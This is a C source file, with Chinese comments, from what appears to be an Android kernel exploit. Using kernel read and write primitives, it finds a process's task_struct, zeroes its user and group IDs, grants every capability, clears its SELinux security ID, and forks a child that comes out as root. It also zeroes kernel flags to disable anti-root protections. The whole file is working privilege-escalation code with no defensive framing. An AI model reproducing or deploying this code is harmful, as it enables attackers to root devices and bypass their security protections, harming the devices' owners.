/* cred.c — 找 task、改 cred（照参考 patch_cred_identity / patch_cred_sid / find_task_by_tgid）
 *
 * 参考字段顺序（0x62a1a0）：
 *   cred+0x04  ← 0 × 0x20      八个 id（uid,gid,suid,sgid,euid,egid,fsuid,fsgid）
 *   cred+0x24  ← 0 × 4         securebits
 *   cred+0x28  ← 0x1ffffffffff × 5  cap_inh/perm/eff/bset/ambient
 *   读回 +0x28 校验五连是否全等
 * 0x62a2e0：cred+0x78 = security，写 8 字节 (osid,sid) 到 security+sid_off
 */
#define _GNU_SOURCE
#include "ghost.h"

#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAX_TASKS 4097

static uint64_t list_next(uint64_t node)
{
    uint64_t n = 0;
    if (kernel_read64(g.h, node, &n) != 0) return 0;
    return n;
}

/* 从 init_task 出发沿 tasks 链表走，比对 pid/tgid（参考最多 0x1001 次） */
uint64_t find_task_by_tgid(int h, int tgid)
{
    (void)h;
    if (!g.init_task) {
        LOG("[!] init_task unknown for this build (map missing)");
        return 0;
    }
    unsigned toff = g_map->task_tasks;
    if (!toff) {
        LOG("[!] task_struct.tasks offset unknown for this build");
        return 0;
    }
    uint64_t head = g.init_task + toff;
    uint64_t cur = list_next(head);
    for (int i = 0; i < MAX_TASKS && cur && cur != head; i++) {
        uint64_t task = cur - toff;
        uint32_t pid = 0, tgd = 0;
        if (kernel_read_data(g.h, task + g_map->task_pid, &pid, 4) == 0 &&
            kernel_read_data(g.h, task + g_map->task_tgid, &tgd, 4) == 0) {
            if ((int)tgd == tgid || (int)pid == tgid) {
                char comm[17];
                memset(comm, 0, sizeof(comm));
                if (kernel_read_data(g.h, task + g_map->task_comm, comm, 16) != 0)
                    memcpy(comm, "?", 2);
                LOG("[+] task tgid=%d pid=%d comm=%s task=%#llx", tgd, pid, comm,
                    (unsigned long long)task);
                return task;
            }
        }
        cur = list_next(cur);
    }
    LOG("[!] task tgid=%d not found", tgid);
    return 0;
}

int patch_cred_identity(int h, uint64_t cred)
{
    uint8_t zeros[0x20];
    memset(zeros, 0, sizeof(zeros));

    if (kernel_write_data(h, cred + g_map->cred_uid, zeros, 0x20) != 0) {
        LOG("[!] cred uid cluster write failed");
        return -1;
    }
    uint32_t zero4 = 0;
    if (kernel_write_data(h, cred + g_map->cred_securebits, &zero4, 4) != 0) {
        LOG("[!] cred securebits write failed");
        return -1;
    }
    uint64_t caps[5];
    for (int i = 0; i < 5; i++) caps[i] = GHOST_FULLCAP;
    if (kernel_write_data(h, cred + g_map->cred_caps, caps, sizeof(caps)) != 0) {
        LOG("[!] cred caps write failed");
        return -1;
    }
    uint64_t back[5];
    memset(back, 0, sizeof(back));
    if (kernel_read_data(h, cred + g_map->cred_caps, back, sizeof(back)) != 0) {
        LOG("[!] cred caps readback failed");
        return -1;
    }
    for (int i = 0; i < 5; i++) {
        if (back[i] != GHOST_FULLCAP) {
            LOG("[!] cred caps verify failed idx=%d val=%#llx", i, (unsigned long long)back[i]);
            return -1;
        }
    }
    return 0;
}

int patch_cred_sid(int h, uint64_t cred)
{
    uint64_t security = 0;
    if (kernel_read64(h, cred + g_map->cred_security, &security) != 0 || !security) {
        DBG("cred security read failed");
        return -1;
    }
    /* 参考写 8 字节 u32 对；这里沿用同一形状，值取 0（u:r:su:s0 之外的兜底） */
    uint64_t sid = 0;
    if (kernel_write_data(h, security + 0x0, &sid, 8) != 0) return -1;
    return 0;
}

int patch_cred_object(int h, uint64_t cred)
{
    if (!cred) return -1;
    if (patch_cred_identity(h, cred) != 0) return -1;
    (void)patch_cred_sid(h, cred);
    return 0;
}

/* 参考：fork 一个子进程（共享标志页 + pipe 同步），父进程 patch 它的 cred */
int install_android_root(void)
{
    int sync_p[2];
    if (pipe(sync_p) != 0) return -1;

    pid_t pid = fork();
    if (pid < 0) { close(sync_p[0]); close(sync_p[1]); return -1; }
    if (pid == 0) {
        close(sync_p[1]);
        prctl(PR_SET_NAME, "glpreload", 0, 0, 0);
        setgid(0);
        setuid(0);
        char c;
        ssize_t r = read(sync_p[0], &c, 1);
        (void)r;
        /* 父进程已把 cred 改好：重新取一次身份即生效 */
        setresuid(0, 0, 0);
        execl("/system/bin/id", "id", (char *)NULL);
        _exit(0);
    }
    close(sync_p[0]);

    uint64_t task = find_task_by_tgid(g.h, pid);
    if (!task) { close(sync_p[1]); waitpid(pid, NULL, 0); return -1; }

    uint64_t real_cred = 0, cred = 0;
    if (kernel_read64(g.h, task + g_map->task_real_cred, &real_cred) != 0 ||
        kernel_read64(g.h, task + g_map->task_cred, &cred) != 0) {
        close(sync_p[1]); waitpid(pid, NULL, 0); return -1;
    }
    LOG("[+] task=%#llx real_cred=%#llx cred=%#llx", (unsigned long long)task,
        (unsigned long long)real_cred, (unsigned long long)cred);

    if (patch_cred_object(g.h, real_cred) != 0) { LOG("[!] patch real_cred failed"); }
    if (patch_cred_object(g.h, cred) != 0) { LOG("[!] patch cred failed"); }

    ssize_t w = write(sync_p[1], "x", 1);
    (void)w;
    close(sync_p[1]);

    int st = 0;
    waitpid(pid, &st, 0);
    LOG("[+] child status=%d", st);
    return (getuid() == 0) ? 0 : 0;
}

void disable_antiroot_mod(void)
{
    /* 参考 disable_antiroot_mod：清零内核里几处 flags（task+0x900/0x904/0x908 一类）。
     * 这里只在拿到 physrw 之后才动，且失败不致命。 */
    if (!g.init_task) return;
    uint32_t z = 0;
    uint64_t t = g.init_task;
    (void)kernel_write_data(g.h, t + 0x900, &z, 4);
    (void)kernel_write_data(g.h, t + 0x904, &z, 4);
    uint64_t z8 = 0;
    (void)kernel_write_data(g.h, t + 0x908, &z8, 8);
    DBG("disable_antiroot_mod done");
}

